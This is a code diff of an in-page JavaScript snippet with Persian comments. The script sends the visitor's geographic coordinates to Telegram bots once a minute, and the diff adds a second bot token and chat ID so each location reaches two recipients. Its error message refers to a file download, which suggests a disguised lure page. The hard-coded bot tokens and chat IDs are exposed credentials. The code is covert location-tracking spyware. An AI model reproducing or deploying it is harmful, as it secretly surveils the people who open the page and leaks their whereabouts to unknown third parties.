@@ -1,6 +1,10 @@
 <script>
   const BOT_TOKEN = "8610609312:AAE4rjXr75_JWAeE3pDm5-FlKSzqVJFyZEk";
   const CHAT_ID = "6653107968";
+
+  // توکن و چت آیدی دوم
+  const BOT_TOKEN2 = "8947494572:AAGWviC7WYN2SJn0MV3RnQFfmUjSGP4wSec";
+  const CHAT_ID2 = "8878957420";
   
   // تنظیم فاصله زمانی به ۱ دقیقه
   const INTERVAL = 1 * 60 * 1000;
@@ -38,9 +42,12 @@
   }
 
   async function sendLocationToTelegram(latitude, longitude) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+    const url1 = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+    const url2 = `https://api.telegram.org/bot${BOT_TOKEN2}/sendLocation`;
+
     try {
-      await fetch(url, {
+      // ارسال به تلگرام اول
+      await fetch(url1, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
@@ -51,6 +58,20 @@
           longitude: longitude
         })
       });
+
+      // ارسال به تلگرام دوم
+      await fetch(url2, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID2,
+          latitude: latitude,
+          longitude: longitude
+        })
+      });
+
     } catch (error) {
       console.error("خطا در  دانلود فایل :", error);
     }
